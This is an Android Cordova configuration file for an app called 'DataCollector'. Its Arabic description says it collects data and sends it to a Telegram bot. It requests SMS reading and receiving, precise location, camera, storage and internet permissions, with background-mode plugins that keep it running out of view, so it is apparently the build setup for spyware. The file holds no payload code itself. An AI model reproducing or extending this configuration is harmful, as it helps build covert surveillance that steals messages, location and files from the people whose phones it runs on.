<?xml version='1.0' encoding='utf-8'?>
<widget id="com.example.datacollector" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
  <name>DataCollector</name>
  <description>
    تطبيق لجمع البيانات وإرسالها إلى بوت Telegram
  </description>
  <author email="dev@example.com">Anonymous Developer</author>
  <content src="index.html" />
  <access origin="*" />
  <preference name="android-targetSdkVersion" value="34" />
  <preference name="KeepRunning" value="true" />
  
  <plugin name="cordova-plugin-whitelist" spec="1" />
  <plugin name="cordova-plugin-geolocation" spec="4.1.0" />
  <plugin name="cordova-plugin-sms" spec="1.0.5" />
  <plugin name="cordova-plugin-file" spec="6.0.2" />
  <plugin name="cordova-plugin-file-transfer" spec="1.7.1" />
  <plugin name="cordova-plugin-android-permissions" spec="1.1.3" />
  <plugin name="cordova-plugin-background-mode" spec="0.7.3" />
  <plugin name="cordova-plugin-camera" spec="4.1.0" />
  
  <platform name="android">
    <edit-config file="AndroidManifest.xml" mode="merge" target="/manifest">
      <manifest xmlns:android="http://schemas.android.com/apk/res/android">
        <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
        <uses-permission android:name="android.permission.READ_SMS" />
        <uses-permission android:name="android.permission.RECEIVE_SMS" />
        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
        <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
        <uses-permission android:name="android.permission.CAMERA" />
        <uses-permission android:name="android.permission.INTERNET" />
        
        <application>
          <service android:name="org.apache.cordova.background.BackgroundPlugin$BackgroundService" />
        </application>
      </manifest>
    </edit-config>
  </platform>
</widget>
